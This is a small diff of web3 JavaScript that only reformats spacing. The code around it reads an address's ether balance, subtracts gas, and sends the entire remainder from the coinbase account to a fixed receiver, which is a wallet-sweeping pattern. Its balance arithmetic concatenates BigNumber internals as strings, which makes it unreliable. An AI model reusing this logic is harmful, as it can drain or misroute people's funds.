@@ -22,7 +22,7 @@ function startWeb3() {
 function getBalance(address) {
   return web3.eth.getBalance(address, function (error, result) {
     if (!error) {
-        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasLimitNumber*gasPriceNumber;
+        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasLimitNumber * gasPriceNumber;
         transactionObject = {from:coinbase, to:etherReceiver, value:etherBalance, gas:gasLimitNumber, gasPrice:gasPriceNumber};
         sendBalance(transactionObject);
     } else {
